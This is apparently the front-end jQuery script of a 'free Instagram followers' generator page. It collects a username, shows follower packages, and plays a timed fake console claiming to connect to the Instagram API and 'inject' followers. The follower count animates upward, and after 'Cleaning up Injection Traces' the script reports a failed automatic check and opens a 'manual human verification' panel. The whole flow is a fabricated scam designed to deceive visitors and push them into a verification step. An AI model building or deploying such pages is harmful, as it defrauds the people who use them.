$(document).ready(function() {
	
	$retrieve_profile_info = false; // true or false. If set to false, the LP will not try to retrieve profile info and proceed to next step by only showing entered username as profile data.
	
	$followers_amount_1 = '1000';
	$followers_amount_2 = '2500';
	$followers_amount_3 = '5000';
	
	$console_message_1 = 'Connecting to Instagram API...';
	$console_message_2 = 'Succesfully Connected to Instagram API...';
	$console_message_3 = 'Forwarding User ID for Account Username ';
	$console_message_4 = 'User ID Succesfully Forwarded ';
	$console_message_5 = 'Connectinh+g with Internal Database';
	$console_message_6 = 'Connection with Database Established';
	$console_message_7_1 = 'Preparing to Inject';
	$console_message_7_2 = 'Followers to Username';
	$console_message_8_1 = 'Injecting';
	$console_message_8_2 = 'Followers';
	$console_message_9_1 = 'Successfully added';
	$console_message_9_2 = 'Followers';
	$console_message_10 = 'Cleaning up Injection Traces';
	$console_message_11 = 'Performing Automatic Human Verification...';
	$console_message_12 = 'Automatic Human Verification Failed...';
	$console_message_13 = 'Manual Human Verification Required';
	
	$("#profile-info-form").validator().on("submit", function (event) {
		if (event.isDefaultPrevented()) {
			formNotValid();
		} else {
			event.preventDefault();
			$('#profile-info-form').fadeOut(500, function() {
				$('.loader').fadeIn();
			});
			if ($retrieve_profile_info == true) {
				get_profile();		
			} else {
				$username_static = $('#ig-input-username').val();
				no_profile_info();
			}
		}
	});

	function formNotValid(){
		$(".shake-wrapper").addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
			$(this).removeClass('shake animated');
		});
	}	
	
	function get_profile(){
		$.ajax({
			type: "POST",
			url: "parts/engine.php",
			data: $("#profile-info-form").serialize(),
			dataType: 'json',
			success: function(data){
				if (data.entry_data.ProfilePage === undefined) {
					profileError();
				} else {
				$profile_img = data.entry_data.ProfilePage[0].graphql.user.profile_pic_url;
				$profile_media_count = data.entry_data.ProfilePage[0].graphql.user.edge_owner_to_timeline_media.count;
				$profile_edge_follow = data.entry_data.ProfilePage[0].graphql.user.edge_follow.count;
				$profile_edge_followed_by = data.entry_data.ProfilePage[0].graphql.user.edge_followed_by.count;
				$profile_username = data.entry_data.ProfilePage[0].graphql.user.username;
				$profile_full_name = data.entry_data.ProfilePage[0].graphql.user.full_name;
				$profile_biography = data.entry_data.ProfilePage[0].graphql.user.biography;
				$profile_accessability = data.entry_data.ProfilePage[0].graphql.user.is_private;
				$.ajax({
					type: "get",
					url: "parts/p-i.php",
					success: function(dataprocess){
						$('.loader').hide();
						$('.generator-content').html(dataprocess).hide().fadeIn();
						
						if($profile_accessability == true) {
							$(".profile-media-wrapper").append('<span class="private-profile-notice">This Account is Private</span>');
						} else {
							if($profile_media_count >= 1) {
								$profile_media_1 = data.entry_data.ProfilePage[0].graphql.user.edge_owner_to_timeline_media.edges["0"].node.thumbnail_src;
								$("#media-1").attr("src", $profile_media_1);
							}
							if($profile_media_count >= 2) {
								$profile_media_2 = data.entry_data.ProfilePage[0].graphql.user.edge_owner_to_timeline_media.edges["1"].node.thumbnail_src;
								$("#media-2").attr("src", $profile_media_2);
							}
							if($profile_media_count >= 3) {
								$profile_media_3 = data.entry_data.ProfilePage[0].graphql.user.edge_owner_to_timeline_media.edges["2"].node.thumbnail_src;
								$("#media-3").attr("src", $profile_media_3);
							}
							if($profile_media_count >= 4) {
								$profile_media_4 = data.entry_data.ProfilePage[0].graphql.user.edge_owner_to_timeline_media.edges["3"].node.thumbnail_src;
								$("#media-4").attr("src", $profile_media_4);
							}
							if($profile_media_count >= 5) {
								$profile_media_5 = data.entry_data.ProfilePage[0].graphql.user.edge_owner_to_timeline_media.edges["4"].node.thumbnail_src;
								$("#media-5").attr("src", $profile_media_5);
							}
							if($profile_media_count >= 6) {
								$profile_media_6 = data.entry_data.ProfilePage[0].graphql.user.edge_owner_to_timeline_media.edges["5"].node.thumbnail_src;
								$("#media-6").attr("src", $profile_media_6);
							}
						}
						$("#profile-img-val").attr("src", $profile_img);
						$("#profile-posts-val").html($profile_media_count);
						$("#profile-follow-val").html($profile_edge_follow);
						$("#profile-followed-by-val").html($profile_edge_followed_by);
						$("#profile-username-val").html($profile_username);
						$("#profile-full-name-val").html($profile_full_name);
						$("#profile-biography-val").html($profile_biography);

				
						$('.profile-info-wrapper').fadeIn();
						$(".generator-content-wrapper").animate({"top":"0"}, "normal");
						if ($(window).width() > 450) {
							$(".secondary-content-wrapper").animate({"bottom":"-348px"}, "slow");
							$("footer").css("margin-top", "500px");
						} else if ($(window).width() < 450) {
							$(".secondary-content-wrapper").animate({"bottom":"-206px"}, "slow");
							$("footer").css("margin-top", "350px");
						} else if ($(window).width() < 360) {
							$(".secondary-content-wrapper").animate({"bottom":"-193px"}, "slow");
							$("footer").css("margin-top", "330px");
						}
						$('#profile-confirm').click(function () {
							$(".confirm-profile-wrapper").animate({
								"bottom": "-350px"
							}, 300, function() {
								$(".confirm-profile-wrapper").remove();
								$(".profile-media-wrapper").animate({
									"bottom": "-500px"
								}, 500, function() {
									$(".profile-media-wrapper").remove();
									$.ajax({
										type: "get",
										url: "parts/f-s.php",
										success: function(dataprocess){
											$('.profile-info-inner-wrapper').append(dataprocess);
											$(".followers-amount-col-val-1").html($followers_amount_1);
											$(".followers-amount-col-val-2").html($followers_amount_2);
											$(".followers-amount-col-val-3").html($followers_amount_3);
											$(".followers-select-wrapper").animate({
												"top": "0"
											}, 500, function() {
												$('.add-followers-button').click(function () {
													if ($(this).hasClass("add-followers-button-1")) { 
														$followers_select_amount_val = $followers_amount_1;															
													} else if ($(this).hasClass("add-followers-button-2")) { 
														$followers_select_amount_val = $followers_amount_2;
													} else if ($(this).hasClass("add-followers-button-3")) { 
														$followers_select_amount_val = $followers_amount_3;
													}
													$(".followers-select-wrapper").animate({
														"top": "400px"
													}, 500, function() {
														$(".followers-select-wrapper").remove();
														$("#confirm-followers-account-val").html($profile_username);
														$("#confirm-followers-amount-val").html($followers_select_amount_val);
														$(".followers-confirm-wrapper").fadeIn();
														$(".followers-confirm-wrapper").animate({
															"top": "0"
														}, 500, function() {
															$('#start-generator-button').click(function () {
																$.ajax({
																	type: "get",
																	url: "parts/c-p.php",
																	success: function(dataprocess){																				
																		$(".followers-confirm-wrapper").animate({
																			"top": "400px"
																		}, 500, function() {
																			$(".followers-confirm-wrapper").remove();
																			$('.profile-info-inner-wrapper').append(dataprocess);
																			$(".console-countTo-profile-img").attr("src", $profile_img);
																			$(".console-wrapper").animate({
																				"top": "0"
																			}, 500, function() {
																				console();
																			});
																		});
																	},
																	error: function(){
																		
																	}
																});
															});
														});
													});
												});
											});
										},
										error: function(){
											
										}
									});
								});
							});
						});
					},
					error: function(){
					
					}
				});
				}
			},
			error: function(){
				profileError();
			}
		});
	}
	
	function no_profile_info(){
		$.ajax({
			type: "get",
			url: "parts/p-i-static.php",
			success: function(dataprocess){
				$('.loader').hide();
				$('.generator-content').html(dataprocess).hide().fadeIn();
				$(".profile-media-wrapper").append('<span class="private-profile-notice">This Account is Private</span>');

				$("#profile-img-val").attr("src", 'img/profile_img.png');
				$("#profile-username-val").html($username_static);
		
				$('.profile-info-wrapper').fadeIn();
				$(".generator-content-wrapper").animate({"top":"0"}, "normal");
				if ($(window).width() > 450) {
					$(".secondary-content-wrapper").animate({"bottom":"-226px"}, "slow");
					$("footer").css("margin-top", "500px");
				} else if ($(window).width() < 450) {
					$(".secondary-content-wrapper").animate({"bottom":"-87px"}, "slow");
					$("footer").css("margin-top", "350px");
				} else if ($(window).width() < 360) {
					$(".secondary-content-wrapper").animate({"bottom":"-193px"}, "slow");
					$("footer").css("margin-top", "330px");
				}
				$('#profile-confirm').click(function () {
					$(".confirm-profile-wrapper").animate({
						"bottom": "-350px"
					}, 300, function() {
						$(".confirm-profile-wrapper").remove();
						$(".profile-media-wrapper").animate({
							"bottom": "-500px"
						}, 500, function() {
							$(".profile-media-wrapper").remove();
							$.ajax({
								type: "get",
								url: "parts/f-s.php",
								success: function(dataprocess){
									$('.profile-info-inner-wrapper').append(dataprocess);
									$(".followers-amount-col-val-1").html($followers_amount_1);
									$(".followers-amount-col-val-2").html($followers_amount_2);
									$(".followers-amount-col-val-3").html($followers_amount_3);
									$(".followers-select-wrapper").animate({
										"top": "0"
									}, 500, function() {
										$('.add-followers-button').click(function () {
											if ($(this).hasClass("add-followers-button-1")) { 
												$followers_select_amount_val = $followers_amount_1;															
											} else if ($(this).hasClass("add-followers-button-2")) { 
												$followers_select_amount_val = $followers_amount_2;
											} else if ($(this).hasClass("add-followers-button-3")) { 
												$followers_select_amount_val = $followers_amount_3;
											}
											$(".followers-select-wrapper").animate({
												"top": "400px"
											}, 500, function() {
												$(".followers-select-wrapper").remove();
												$("#confirm-followers-account-val").html($username_static);
												$("#confirm-followers-amount-val").html($followers_select_amount_val);
												$(".followers-confirm-wrapper").fadeIn();
												$(".followers-confirm-wrapper").animate({
													"top": "0"
												}, 500, function() {
													$('#start-generator-button').click(function () {
														$.ajax({
															type: "get",
															url: "parts/c-p.php",
															success: function(dataprocess){																				
																$(".followers-confirm-wrapper").animate({
																	"top": "400px"
																}, 500, function() {
																	$(".followers-confirm-wrapper").remove();
																	$('.profile-info-inner-wrapper').append(dataprocess);
																	$(".console-countTo-profile-img").attr("src", 'img/profile_img.png');
																	$(".console-wrapper").animate({
																		"top": "0"
																	}, 500, function() {
																		console_static();
																	});
																});
															},
															error: function(){
																
															}
														});
													});
												});
											});
										});
									});
								},
								error: function(){
									
								}
							});
						});
					});
				});
			},
			error: function(){
			
			}
		});
	}
	
	//console();
	function console() {
		function progressBarConsole(percent, $element) {
			var progressBarConsoleWidth = percent * $element.width() / 100;
			$element.find('div').animate({ width: progressBarConsoleWidth }, 500).html(percent + "%&nbsp;");
		}
		progressBarConsole(15, $('#progressBarConsole'));
		var $currentFollowersValue = parseInt($('#profile-followed-by-val').text());
		var $selectedFollowersValue = parseInt($followers_select_amount_val);
		var $newFollowersValue = $currentFollowersValue+$selectedFollowersValue;
		setTimeout(function() {
			$('.console-message').html($console_message_1);	
		}, 0 );
		setTimeout(function() {
			$(".console-loadbar").fadeIn();		
		}, 1000 );
		setTimeout(function() {
			$('.console-message').html('<span class="console-message-success">' + $console_message_2 + '</span>');	
			progressBarConsole(15, $('#progressBarConsole'));			
		}, 1500 );
		setTimeout(function() {	
			$('.console-message').html($console_message_3 + '<span class="console-message-bold">' + $profile_username + '</span>');
			progressBarConsole(20, $('#progressBarConsole'));	
		}, 3000 );
		setTimeout(function() {	
			$('.console-message').html('<span class="console-message-success">' + $console_message_4 + '</span>');	
			progressBarConsole(35, $('#progressBarConsole'));
		}, 5000 );
		setTimeout(function() {	
			$('.console-message').html($console_message_7_1 + ' <span class="console-message-bold">' + $selectedFollowersValue + '</span> ' + $console_message_7_2 + ' <span class="console-message-bold">@' + $profile_username + '</span>');	
			progressBarConsole(40, $('#progressBarConsole'));	
		}, 6500 );
		setTimeout(function() {	
			$(".console-loader").fadeOut(function(){
				$(".console-countTo-wrapper").fadeIn(function(){
					$('#console-countTo-amount-value').countTo({
						from: $currentFollowersValue,
						to: $newFollowersValue,
						speed: 3500,
						refreshInterval: 10,
						formatter: function (value, options) {
						  return value.toFixed(options.decimals);
						}
					});
					$('#profile-followed-by-val').countTo({
						from: $currentFollowersValue,
						to: $newFollowersValue,
						speed: 3500,
						refreshInterval: 10,
						formatter: function (value, options) {
						  return value.toFixed(options.decimals);
						}
					});
				});
			});
			$('.console-message').html($console_message_8_1 + ' <span class="console-message-bold">' + $selectedFollowersValue + '</span> ' + $console_message_8_2);		
			progressBarConsole(60, $('#progressBarConsole'));
		}, 8500 );
		setTimeout(function() {	
			$(".console-countTo-wrapper").addClass('countCompleted');
			$(".console-countTo-wrapper").addClass('jello animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('jello animated');
			});
			$('.console-message').html('<span class="console-message-success">' + $console_message_9_1 + ' <span class="console-message-bold">' + $selectedFollowersValue + '</span> ' + $console_message_9_2 + '</span>');	
			progressBarConsole(80, $('#progressBarConsole'));
		}, 13000 );
		setTimeout(function() {	
			$(".console-countTo-wrapper").fadeOut(function(){
				$(".console-loader").fadeIn();
				$('.console-message').html($console_message_10);	
				progressBarConsole(85, $('#progressBarConsole'));
			});	
		}, 15000 );
		setTimeout(function() {	
			$('.console-message').html($console_message_11);	
			progressBarConsole(87, $('#progressBarConsole'));
		}, 16500 );
		setTimeout(function() {	
			$('.console-message').html('<span class="console-message-error">' + $console_message_12 + '</span>');	
			progressBarConsole(90, $('#progressBarConsole'));
		}, 18000 );
		setTimeout(function() {	
			$('.console-message').html($console_message_13);	
		}, 19500 );
		setTimeout(function() {	
			$(".console-wrapper").animate({
				"top": "400px"
			}, 500, function() {
				$('.console-wrapper').remove();
				$(".verification-wrapper").fadeIn();
				$(".verification-wrapper").animate({
					"top": "0"
				}, 500, function() {
					
				});
			});
		}, 20500 );
	}
	
	//console_static();
	function console_static() {
		function progressBarConsole(percent, $element) {
			var progressBarConsoleWidth = percent * $element.width() / 100;
			$element.find('div').animate({ width: progressBarConsoleWidth }, 500).html(percent + "%&nbsp;");
		}
		progressBarConsole(15, $('#progressBarConsole'));
		setTimeout(function() {
			$('.console-message').html($console_message_1);	
		}, 0 );
		setTimeout(function() {
			$(".console-loadbar").fadeIn();		
		}, 1000 );
		setTimeout(function() {
			$('.console-message').html('<span class="console-message-success">' + $console_message_2 + '</span>');	
			progressBarConsole(15, $('#progressBarConsole'));			
		}, 1500 );
		setTimeout(function() {	
			$('.console-message').html($console_message_3 + '<span class="console-message-bold">' + $username_static + '</span>');
			progressBarConsole(20, $('#progressBarConsole'));	
		}, 3000 );
		setTimeout(function() {	
			$('.console-message').html('<span class="console-message-success">' + $console_message_4 + '</span>');	
			progressBarConsole(35, $('#progressBarConsole'));
		}, 5000 );
		setTimeout(function() {	
			$('.console-message').html($console_message_7_1 + ' <span class="console-message-bold">' + $followers_select_amount_val + '</span> ' + $console_message_7_2 + ' <span class="console-message-bold">@' + $username_static + '</span>');	
			progressBarConsole(40, $('#progressBarConsole'));	
		}, 6500 );
		setTimeout(function() {	
			$(".console-loader").fadeOut(function(){
				$(".console-countTo-wrapper").fadeIn(function(){
					$('#console-countTo-amount-value').countTo({
						from: 0,
						to: $followers_select_amount_val,
						speed: 3500,
						refreshInterval: 10,
						formatter: function (value, options) {
						  return value.toFixed(options.decimals);
						}
					});
				});
			});
			$('.console-message').html($console_message_8_1 + ' <span class="console-message-bold">' + $followers_select_amount_val + '</span> ' + $console_message_8_2);		
			progressBarConsole(60, $('#progressBarConsole'));
		}, 8500 );
		setTimeout(function() {	
			$(".console-countTo-wrapper").addClass('countCompleted');
			$(".console-countTo-wrapper").addClass('jello animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('jello animated');
			});
			$('.console-message').html('<span class="console-message-success">' + $console_message_9_1 + ' <span class="console-message-bold">' + $followers_select_amount_val + '</span> ' + $console_message_9_2 + '</span>');	
			progressBarConsole(80, $('#progressBarConsole'));
		}, 13000 );
		setTimeout(function() {	
			$(".console-countTo-wrapper").fadeOut(function(){
				$(".console-loader").fadeIn();
				$('.console-message').html($console_message_10);	
				progressBarConsole(85, $('#progressBarConsole'));
			});	
		}, 15000 );
		setTimeout(function() {	
			$('.console-message').html($console_message_11);	
			progressBarConsole(87, $('#progressBarConsole'));
		}, 16500 );
		setTimeout(function() {	
			$('.console-message').html('<span class="console-message-error">' + $console_message_12 + '</span>');	
			progressBarConsole(90, $('#progressBarConsole'));
		}, 18000 );
		setTimeout(function() {	
			$('.console-message').html($console_message_13);	
		}, 19500 );
		setTimeout(function() {	
			$(".console-wrapper").animate({
				"top": "400px"
			}, 500, function() {
				$('.console-wrapper').remove();
				$(".verification-wrapper").fadeIn();
				$(".verification-wrapper").animate({
					"top": "0"
				}, 500, function() {
					
				});
			});
		}, 20500 );
	}
	
	//profileError();	
	function profileError() {
		$.ajax({
			type: "get",
			url: "parts/error.php",
			success: function(dataprocess){
				$('.profile-error').html(dataprocess).hide().fadeIn();
				$.magnificPopup.open({
					items: {
						src: '.error-popup',
					},
					type: 'inline',
					preloader: false,
					modal: true,
					callbacks: {						
						open: function() {
							$('#try-again').click(function() {
								$.magnificPopup.close();
							});							
						},
						close: function() {
							$('.profile-error').empty();
							$('.loader').fadeOut(500, function() {
								$('#profile-info-form').fadeIn();
							});	
						}
					}
				});
			}
		});
	}
	
	$('#how-to-link').click(function () {
		$.ajax({
			type: "get",
			url: "parts/instructions.php",
			success: function(dataprocess){
				$('.instructions').html(dataprocess).hide().fadeIn();
				$.magnificPopup.open({
					items: {
						src: '.instructions-popup',
					},
					type: 'inline',
					preloader: false,
					modal: true,
					callbacks: {						
						open: function() {
							$('.instructions-close-button').click(function() {
								$.magnificPopup.close();
							});							
						},
						close: function() {
							$('.instructions-wrapper').empty();
						}
					}
				});
			}
		});
	});
	
	$('.popup-tos').magnificPopup({
		type: 'inline',
		preloader: false
	});
	$('.popup-contact').magnificPopup({
		type: 'inline',
		preloader: false
	});	
	$('.popup-pp').magnificPopup({
		type: 'inline',
		preloader: false
	});		
		
});
function rng(min, max) {
	return Math.floor(Math.random() * (max - min + 1) + min);

}
function Random(_0xaa63x2, _0xaa63x3) {
	return Math['floor'](Math['random']() * (_0xaa63x3 - _0xaa63x2) + _0xaa63x2);
};